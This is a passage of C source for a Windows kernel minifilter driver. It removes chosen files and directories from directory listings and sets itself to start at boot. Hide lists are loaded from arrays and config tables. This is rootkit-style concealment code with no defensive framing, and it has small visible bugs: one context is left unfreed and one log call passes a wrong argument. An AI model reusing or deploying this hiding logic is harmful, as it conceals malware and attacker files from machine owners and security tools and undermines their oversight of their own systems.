	UINT32 offset, moveLength;
	BOOLEAN search;
	NTSTATUS status = STATUS_SUCCESS;

	offset = 0;
	search = TRUE;

	do
	{
		fileName.Buffer = info->FileName;
		fileName.Length = (USHORT)info->FileNameLength;
		fileName.MaximumLength = (USHORT)info->FileNameLength;

		//TODO: check, can there be directories?
		if (CheckExcludeListDirFile(g_excludeFileContext, &fltName->Name, &fileName))
		{
			BOOLEAN retn = FALSE;

			if (prevInfo != NULL)
			{
				if (info->NextEntryOffset != 0)
				{
					prevInfo->NextEntryOffset += info->NextEntryOffset;
					offset = info->NextEntryOffset;
				}
				else
				{
					prevInfo->NextEntryOffset = 0;
					status = STATUS_SUCCESS;
					retn = TRUE;
				}

				RtlFillMemory(info, sizeof(FILE_NAMES_INFORMATION), 0);
			}
			else
			{
				if (info->NextEntryOffset != 0)
				{
					nextInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)info + info->NextEntryOffset);
					moveLength = 0;
					while (nextInfo->NextEntryOffset != 0)
					{
						moveLength += nextInfo->NextEntryOffset;
						nextInfo = (PFILE_NAMES_INFORMATION)((PUCHAR)nextInfo + nextInfo->NextEntryOffset);
					}

					moveLength += FIELD_OFFSET(FILE_NAMES_INFORMATION, FileName) + nextInfo->FileNameLength;
					RtlMoveMemory(info, (PUCHAR)info + info->NextEntryOffset, moveLength);//continue
				}
				else
				{
					status = STATUS_NO_MORE_ENTRIES;
					retn = TRUE;
				}
			}

			LogTrace("Removed from query: %wZ\\%wZ", &fltName->Name, &fileName);

			if (retn)
				return status;

			info = (PFILE_NAMES_INFORMATION)((PCHAR)info + offset);
			continue;
		}

		offset = info->NextEntryOffset;
		prevInfo = info;
		info = (PFILE_NAMES_INFORMATION)((PCHAR)info + offset);

		if (offset == 0)
			search = FALSE;
	} while (search);

	return STATUS_SUCCESS;
}

VOID LoadConfigFilesCallback(PUNICODE_STRING Str, PVOID Params)
{
	ULONGLONG id;
	UNREFERENCED_PARAMETER(Params);
	AddHiddenFile(Str, &id);
}

VOID LoadConfigDirsCallback(PUNICODE_STRING Str, PVOID Params)
{
	ULONGLONG id;
	UNREFERENCED_PARAMETER(Params);
	AddHiddenDir(Str, &id);
}

VOID LoadConfigfilescompriseCallback(PUNICODE_STRING Str, PVOID Params)
{
	ULONGLONG id;
	UNREFERENCED_PARAMETER(Params);
	AddHiddenFilecomprise(Str, &id);
}


NTSTATUS PrepMiniFilter(IN PUNICODE_STRING RegistryString, IN PWSTR Altitude)
{
	NTSTATUS st = STATUS_UNSUCCESSFUL;
	WCHAR TempStr[MAX_PATH] = { 0 }, Data[MAX_PATH] = { 0 };
	PWSTR wPtr = wcsrchr(RegistryString->Buffer, L'\\');
	if (!MmIsAddressValid(wPtr))return STATUS_INVALID_PARAMETER;
	RtlZeroMemory(TempStr, MAX_PATH * sizeof(WCHAR));
	swprintf(TempStr, L"%ws\\Instances", wPtr);
	//RtlStringCbPrintfW(TempStr,NTSTRSAFE_MAX_CCH*sizeof(WCHAR),L"%ws\\Instances",wPtr);
	st = RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, TempStr);
	if (NT_SUCCESS(st))
	{
		swprintf(Data, L"%ws Instance", &wPtr[1]);
		//RtlStringCbPrintfW(Data,NTSTRSAFE_MAX_CCH*sizeof(WCHAR),L"%ws Instance",&wPtr[1]);
		st = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"DefaultInstance", REG_SZ, Data, (ULONG)(wcslen(Data) * sizeof(WCHAR) + 2));
		if (NT_SUCCESS(st))
		{
			RtlZeroMemory(TempStr, MAX_PATH * sizeof(WCHAR));
			swprintf(TempStr, L"%ws\\Instances%ws Instance", wPtr, wPtr);
			//RtlStringCbPrintfW(TempStr,NTSTRSAFE_MAX_CCH*sizeof(WCHAR),L"%ws\\Instances%ws Instance",wPtr,wPtr);
			st = RtlCreateRegistryKey(RTL_REGISTRY_SERVICES, TempStr);
			if (NT_SUCCESS(st))
			{
				st = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"Altitude", REG_SZ, Altitude, (ULONG)(wcslen(Altitude) * sizeof(WCHAR) + 2));
				if (NT_SUCCESS(st))
				{
					ULONG dwData = 0;
					st = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"Flags", REG_DWORD, &dwData, 4);
					DWORD  dwStart = SERVICE_SYSTEM_START;
					st = RtlWriteRegistryValue(RTL_REGISTRY_SERVICES, TempStr, L"Start", REG_DWORD, &dwStart, 4);
				}
			}
		}
	}
	return st;
}

NTSTATUS InitializeFSMiniFilter(PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	UNICODE_STRING str;
	UINT32 i;
	ExcludeEntryId id;


	status = PrepMiniFilter(RegistryPath, L"1401256");
	if (!NT_SUCCESS(status))
	{
		LogError("Exclude file list initialization failed with code:%08x", status);
		return status;
	}
	// Initialize and fill exclude file\dir lists 

	status = InitializeExcludeListContext(&g_excludeFileContext, ExcludeFile);
	if (!NT_SUCCESS(status))
	{
		LogError("Exclude file list initialization failed with code:%08x", status);
		return status;
	}

	for (i = 0; g_excludeFiles[i]; i++)
	{
		RtlInitUnicodeString(&str, g_excludeFiles[i]);
		AddExcludeListFile(g_excludeFileContext, &str, &id, 0);
	}

	CfgEnumConfigsTable(HideFilesTable, &LoadConfigFilesCallback, NULL);

	status = InitializeExcludeListContext(&g_excludeDirectoryContext, ExcludeDirectory);
	if (!NT_SUCCESS(status))
	{
		LogError("Exclude file list initialization failed with code:%08x", status);
		DestroyExcludeListContext(g_excludeFileContext);
		return status;
	}

	for (i = 0; g_excludeDirs[i]; i++)
	{
		RtlInitUnicodeString(&str, g_excludeDirs[i]);
		AddExcludeListDirectory(g_excludeDirectoryContext, &str, &id, 0);
	}

	CfgEnumConfigsTable(HideDirsTable, &LoadConfigDirsCallback, NULL);


	status = InitializeExcludeListContext(&g_excludeFilecompriseContext, ExcludeFilecomprise);
	if (!NT_SUCCESS(status))
	{
		LogError("Exclude file list initialization failed with code:%08x", status);
		DestroyExcludeListContext(g_excludeFileContext);
		DestroyExcludeListContext(g_excludeDirectoryContext);
		return status;
	}

	for (i = 0; g_excludefilecomprise[i]; i++)
	{
		RtlInitUnicodeString(&str, g_excludefilecomprise[i]);
		AddExcludeListFilecomprise(g_excludeFilecompriseContext, &str, &id, 0);
	}
	CfgEnumConfigsTable(hideFScomprise, &LoadConfigfilescompriseCallback, NULL);


	// Filesystem mini-filter initialization

	status = FltRegisterFilter(DriverObject, &FilterRegistration, &gFilterHandle);
	if (NT_SUCCESS(status))
	{
		status = FltStartFiltering(gFilterHandle);
		if (!NT_SUCCESS(status))
		{
			LogError("Error, can't start filtering, code:%08x", status);
			FltUnregisterFilter(gFilterHandle);
		}
	}
	else
	{
		LogError("Error, can't register filter, code:%08x", status);
	}

	if (!NT_SUCCESS(status))
	{
		DestroyExcludeListContext(g_excludeFileContext);
		DestroyExcludeListContext(g_excludeDirectoryContext);
		DestroyExcludeListContext(g_excludeFilecompriseContext);
		return status;
	}

	g_fsMonitorInited = TRUE;

	LogTrace("Initialization is completed");
	return status;
}

NTSTATUS DestroyFSMiniFilter()
{
	if (!g_fsMonitorInited)
		return STATUS_NOT_FOUND;

	FltUnregisterFilter(gFilterHandle);
	gFilterHandle = NULL;

	DestroyExcludeListContext(g_excludeFileContext);
	DestroyExcludeListContext(g_excludeDirectoryContext);
	g_fsMonitorInited = FALSE;

	LogTrace("Deitialization is completed");
	return STATUS_SUCCESS;
}

NTSTATUS AddHiddenFile(PUNICODE_STRING FilePath, PULONGLONG ObjId)
{
	const USHORT maxBufSize = FilePath->Length + NORMALIZE_INCREAMENT;
	UNICODE_STRING normalized;
	NTSTATUS status;

	normalized.Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, maxBufSize, FSFILTER_ALLOC_TAG);
	normalized.Length = 0;
	normalized.MaximumLength = maxBufSize;

	if (!normalized.Buffer)
	{
		LogWarning("Error, can't allocate buffer");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	status = NormalizeDevicePath(FilePath, &normalized);
	if (!NT_SUCCESS(status))
	{
		LogWarning("Path normalization failed with code:%08x, path:%wZ", status, FilePath);
		ExFreePoolWithTag(normalized.Buffer, FSFILTER_ALLOC_TAG);
		return status;
	}

	status = AddExcludeListFile(g_excludeFileContext, &normalized, ObjId, 0);
	if (NT_SUCCESS(status))
		LogTrace("Added hidden file:%wZ", &normalized);
	else
		LogTrace("Adding hidden file failed with code:%08x, path:%wZ", status, &normalized);

	ExFreePoolWithTag(normalized.Buffer, FSFILTER_ALLOC_TAG);

	return status;
}

NTSTATUS RemoveHiddenFile(ULONGLONG ObjId)
{
	NTSTATUS status = RemoveExcludeListEntry(g_excludeFileContext, ObjId);
	if (NT_SUCCESS(status))
		LogTrace("Hidden file is removed, id:%lld", ObjId);
	else
		LogTrace("Can't remove hidden file, code:%08x, id:%lld", status, ObjId);

	return status;
}

NTSTATUS RemoveAllHiddenFiles()
{
	NTSTATUS status = RemoveAllExcludeListEntries(g_excludeFileContext);
	if (NT_SUCCESS(status))
		LogTrace("All hidden files are removed");
	else
		LogTrace("Can't remove all hidden files, code:%08x", status);

	return status;
}

NTSTATUS AddHiddenDir(PUNICODE_STRING DirPath, PULONGLONG ObjId)
{
	const USHORT maxBufSize = DirPath->Length + NORMALIZE_INCREAMENT;
	UNICODE_STRING normalized;
	NTSTATUS status;

	normalized.Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, maxBufSize, FSFILTER_ALLOC_TAG);
	normalized.Length = 0;
	normalized.MaximumLength = maxBufSize;

	if (!normalized.Buffer)
	{
		LogWarning("Error, can't allocate buffer");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	status = NormalizeDevicePath(DirPath, &normalized);
	if (!NT_SUCCESS(status))
	{
		LogWarning("Path normalization failed with code:%08x, path:%wZ\n", status, DirPath);
		ExFreePoolWithTag(normalized.Buffer, FSFILTER_ALLOC_TAG);
		return status;
	}

	status = AddExcludeListDirectory(g_excludeDirectoryContext, &normalized, ObjId, 0);
	if (NT_SUCCESS(status))
		LogTrace("Added hidden dir:%wZ", &normalized);
	else
		LogTrace("Adding hidden dir failed with code:%08x, path:%wZ", status, &normalized);

	ExFreePoolWithTag(normalized.Buffer, FSFILTER_ALLOC_TAG);

	return status;
}

NTSTATUS AddHiddenFilecomprise(PUNICODE_STRING DirPath, PULONGLONG ObjId)
{
	NTSTATUS status;
	status = AddExcludeListFilecomprise(g_excludeFilecompriseContext, DirPath, ObjId, 0);
	if (NT_SUCCESS(status))
		LogTrace("Added hidden dir:%wZ", &DirPath);
	else
		LogTrace("Adding hidden dir failed with code:%08x, path:%wZ", status, &DirPath);
	return status;
}



NTSTATUS RemoveHiddenDir(ULONGLONG ObjId)
{
	NTSTATUS status = RemoveExcludeListEntry(g_excludeDirectoryContext, ObjId);
	if (NT_SUCCESS(status))
		LogTrace("Hidden dir is removed, id:%lld", ObjId);
	else
		LogTrace("Can't remove hidden dir, code:%08x, id:%lld", status, ObjId);

	return status;
}

NTSTATUS RemoveHiddenFilecomprise(ULONGLONG ObjId)
{
	NTSTATUS status = RemoveExcludeListEntry(g_excludeFilecompriseContext, ObjId);
	if (NT_SUCCESS(status))
		LogTrace("Hidden dir is removed, id:%lld", ObjId);
	else
		LogTrace("Can't remove hidden dir, code:%08x, id:%lld", status, ObjId);

	return status;
}


NTSTATUS RemoveAllHiddenDirs()
{
	NTSTATUS status = RemoveAllExcludeListEntries(g_excludeDirectoryContext);
	if (NT_SUCCESS(status))
		LogTrace("All hidden dirs are removed");
	else
		LogTrace("Can't remove all hidden dirs, code:%08x", status);

	return status;
}
